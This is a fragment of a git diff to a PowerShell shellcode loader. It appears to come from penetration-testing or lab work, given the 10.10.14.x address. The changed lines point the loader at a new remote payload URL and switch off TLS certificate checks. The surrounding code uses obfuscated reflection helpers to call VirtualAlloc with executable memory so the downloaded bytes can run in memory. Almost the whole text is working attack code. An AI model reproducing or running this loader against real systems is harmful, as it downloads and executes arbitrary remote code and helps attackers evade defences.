@@ -17,7 +17,8 @@ $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $f
 return $type.CreateType()
 }
 
-$url = "http://192.168.2.228:8080/http_wifi.bin"
+$url = "https://10.10.14.8:8080/http_.bin"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 [Byte[]] $buf = [System.Net.WebClient]::new().DownloadData($url)
 
 $cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
